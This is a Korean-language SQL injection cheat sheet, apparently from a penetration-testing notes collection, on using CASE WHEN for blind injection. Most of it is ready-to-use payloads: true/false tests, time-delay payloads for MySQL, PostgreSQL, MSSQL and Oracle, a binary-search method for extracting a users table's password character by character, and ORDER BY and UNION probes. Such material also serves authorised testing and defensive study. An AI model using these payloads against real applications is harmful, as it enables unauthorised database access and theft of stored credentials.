# SQL 인젝션 CASE WHEN 치트시트

- CASE WHEN은 조건의 참·거짓을 값으로 바꾸는 식이라 블라인드 SQLi에서 판정과 시간 지연을 만든다.
- ORDER BY와 조합하면 화면에 값이 나오지 않아도 행 순서로 조건을 읽을 수 있다.
- THEN과 ELSE는 같은 자료형이어야 하고 END를 반드시 닫아야 한다.

## 기본 문법

### searched CASE (인젝션에서 주로 쓰는 형태)

```sql
CASE WHEN 조건1 THEN 값1 WHEN 조건2 THEN 값2 ELSE 값3 END
```

### simple CASE

```sql
CASE 표현식 WHEN 값1 THEN 결과1 WHEN 값2 THEN 결과2 ELSE 결과3 END
```

- simple CASE는 `CASE status WHEN 1 THEN 'admin' ...`처럼 비교 대상이 한 값으로 고정될 때 쓴다.
- searched CASE는 조건에 서브쿼리·비교·함수를 자유롭게 넣을 수 있어 인젝션에 적합하다.

## 참·거짓을 숫자로 바꾸기

```sql
' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1-- -
' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users)>5 THEN 1 ELSE 0 END)=1-- -
' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE 'a%')>0 THEN 1 ELSE 0 END)=1-- -
```

- MySQL은 `FROM dual` 없이 서브쿼리를 쓸 수 있고, Oracle은 `FROM dual`을 붙여야 한다.
- `=1` 대신 `>0`도 같은 판정이 된다.

## 블라인드 시간 지연

```sql
-- MySQL
' AND (CASE WHEN (조건) THEN SLEEP(5) ELSE 0 END)-- -

-- PostgreSQL
' AND (SELECT CASE WHEN (조건) THEN pg_sleep(5) ELSE pg_sleep(0) END IS NOT NULL)-- -

-- MSSQL: CASE 안에서 WAITFOR를 쓸 수 없어 IF를 쓴다
'; IF(조건) WAITFOR DELAY '0:0:5'--

-- Oracle
' AND (SELECT CASE WHEN (조건) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 'a' END FROM dual)='a'--
```

- 거짓 분기에 지연이 없는지 먼저 확인한다. 양쪽 분기가 다 실행되면 참·거짓 구분이 사라진다.
- MySQL의 `SLEEP()`은 정상 완료 시 0을 반환해 `AND 0`이 되지만 지연은 그대로 발생한다.

## 문자 추출 (바이너리 서치)

```sql
' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64) THEN 1 ELSE 0 END)=1-- -
' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))&64)=64 THEN 1 ELSE 0 END)=1-- -
```

- 한 글자를 95회가 아니라 7회 요청으로 확정한다.
- MSSQL은 `SUBSTRING`, PostgreSQL은 `substring`, Oracle은 `SUBSTR`를 쓴다.

## ORDER BY와 조합

```sql
' ORDER BY (CASE WHEN (조건) THEN 1 ELSE 2 END)-- -
```

- 조건이 참이면 오름차순, 거짓이면 다른 순서가 되어 첫 행을 비교로 판정한다.
- ORDER BY 탐침은 [MySQL ORDER BY 치트시트](./mysql_order_by_sqli.md) 참조.

## UNION 출력에 조건 심기

```sql
' UNION SELECT 1,(CASE WHEN (조건) THEN 'YES' ELSE 'NO' END),3-- -
' UNION SELECT 1,(CASE WHEN (SELECT COUNT(*) FROM users)>5 THEN 'many' ELSE 'few' END),3-- -
```

## 주의

- END가 빠지면 문법 에러가 난다. 에러가 나면 괄호와 END부터 확인한다.
- THEN과 ELSE의 자료형이 다르면 형변환에 실패할 수 있다. 문자열은 문자열끼리, 숫자는 숫자끼리 맞춘다.
- CASE 안의 서브쿼리는 `SELECT`로 감싼다. Oracle은 `FROM dual`이 필요하다.
- URL 인코딩 시 공백은 `+` 또는 `%20`으로 바꾼다.
